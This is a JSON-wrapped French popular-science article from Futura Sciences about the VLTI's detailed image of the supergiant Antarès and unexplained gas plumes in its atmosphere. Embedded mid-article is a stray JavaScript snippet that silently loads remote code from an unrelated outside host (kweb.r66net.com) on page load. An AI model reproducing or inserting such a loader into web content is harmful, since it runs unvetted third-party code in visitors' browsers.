{"title": "Étoile : l'extraordinaire image de la supergéante rouge Antarès", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "24/08/2017", "content": "Visible l'été, vers le sud, reconnaissable à sa teinte rouge, l'étoile Antarès est passée devant un des meilleurs photographes du monde : le VLTI, qui combine la luminosité collectée par plusieurs télescopes géants. Le résultat est un portrait sans précédent, offrant une cartographie des gaz en mouvement à sa surface. C'est la toute première image d'une telle qualité pour une étoile autre que le Soleil. Ce qu'il faut retenir Les mouvements de gaz à la surface d’une étoile autre que le Soleil ont été cartographiés pour la première fois avec précision, grâce au VLTI. Il s’agit d’Antarès, une supergéante rouge, 12 fois plus massive que le Soleil et 700 fois plus grande. Des turbulences de gaz de faible densité ont été détectées à de plus grandes distances du centre de l’étoile que prévu. Elles ne sont pas liées à la convection et leur processus reste inconnu.  Cet été, vous avez sans doute aperçu  Antarès , frémissant au-dessus de l'horizon sud au début de la nuit. L' étoile , une des plus brillantes du ciel en cette période de l'année, arbore une  couleur  rouge-orangé qui lui a valu d'ailleurs d'être baptisée dans l'antiquité, la « rivale de Mars », d'où son nom forgé avec  anti  et Arès, le nom grec de Mars. Voir aussi : Quelle est la plus grosse étoile de l'univers ? Elle brille dans la  constellation du Scorpion , non loin (pour nous) du centre de la  Voie lactée . Mais plus pour très longtemps. En effet, la  supergéante rouge , environ 700 fois plus grande que notre  Soleil  s'essouffle... Elle est actuellement plus grande qu'une autre célèbre supergéante rouge,  Bételgeuse , dans  Orion ) et 12 fois plus massive. Au cours de sa vie, relativement courte, l'étoile aurait perdu l'équivalent de trois  masses  solaires. Plus elle grandit, plus la densité à sa surface diminue, et plus elle se refroidit. Dans peu de temps — à l'échelle astronomique —, elle deviendra une  supernova  ( effondrement  de l'étoile sur son cœur). Sans doute, une des prochaines que l'humanité pourra voir. Grâce au VLTI, les astronomes ont réalisé cette magnifique image de la supergéante rouge Antarès. C'ets à ce jour l’image la plus détaillée d’une étoile autre que le Soleil. Remarquez les taches lumineuses. © ESO, K. Ohnaka                               D’étranges mouvements de gaz détectés sur Antarès Pour prendre le  pouls  d' Antarès  et en savoir un peu plus sur son état et, plus généralement, sur le déclin de ces monstres stellaires, une équipe d'astronomes a pu profiter du puissant  interféromètre  du  VLT  ( Very Large Telescope ). Cet instrument combine la  lumière  des  télescopes  géants de l'observatoire du mont Paranal (Chili) pour créer un  miroir  virtuel géant de quelque 200 m de diamètre. Grâce à lui, les astronomes ont pu imager et même cartographier en deux dimensions les mouvements à la surface d'Antarès.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Comme l'explique Keiichi Ohnaka, l'auteur principal de l'étude publiée dans  Nature  (et diffusé par l' ESO ),  « le processus responsable de la perte de masse si rapide d'étoiles en fin de vie comme Antarès est demeurée incompris durant plus d'un demi-siècle »  Aussi, pour tenter de l'éclaircir, qui mieux que le VLTI pouvait le faire ?  « Le VLTI est le seul instrument qui nous a permis de mesurer directement les mouvements de  gaz  au sein de l' atmosphère  étendue d'Antarès. » Animation d’Antarès — l’étoile la plus brillante du Scorpion et 700 fois plus grande que notre Soleil —, et des turbulences à sa surface. © ESO, M. Kornmesser Donc, grâce au VLTI et aussi à l'instrument  Amber  ( Astronomical Multi-BEam combineR ), l'équipe a ainsi pu créer la première carte des « bouillonnements » de gaz dans l'atmosphère d'une étoile autre que le Soleil, et acquérir des images distinctes de sa surface  « sur une petite portion du spectre  infrarouge  » , indique un  communiqué de l'ESO . Ces données renseignent sur la  vitesse  des gaz en  mouvement ,  « [...] une étape clé dans la résolution de ce problème  » . Les chercheurs ont découvert l'existence de panaches de gaz de faible densité à des distances plus grandes que prévu du centre de la supergéante rouge. Ils ont pu déterminer que ces  turbulences  ne sont pas liées à la  convection  à l'intérieur de l' étoile géante . Donc, pour l'instant, leur mécanisme reste une énigme. Bien sûr, pour Keiichi Ohnaka,  «  le prochain défi consiste à identifier la source de ces mouvements turbulents » . Nul doute que de nouvelles observations sont d'ores et déjà prévues. Satisfait, il conclut :  « notre travail offre une nouvelle dimension à l' astrophysique  stellaire et ouvre une nouvelle  fenêtre  d'étude des étoiles ». Voir aussi : Le secret de la formation des étoiles massives a été découvert ! ", "theme": "sciences"}